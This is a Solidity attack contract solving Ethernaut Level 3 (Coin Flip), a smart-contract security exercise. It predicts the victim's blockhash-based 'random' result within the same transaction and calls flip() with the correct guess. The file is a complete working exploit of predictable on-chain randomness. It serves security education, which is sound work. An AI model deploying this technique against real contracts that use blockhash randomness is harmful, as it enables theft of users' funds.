// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Exploits Ethernaut Level 3 — Coin Flip. The victim derives its
///         result from the previous block's hash divided by a known
///         constant FACTOR: fully deterministic and readable by anyone
///         before the call. This contract reproduces the exact same
///         calculation within the same transaction as flip(), guaranteeing
///         both read the same blockhash.
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public victim;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimAddress) {
        victim = ICoinFlip(_victimAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        victim.flip(side);
    }
}
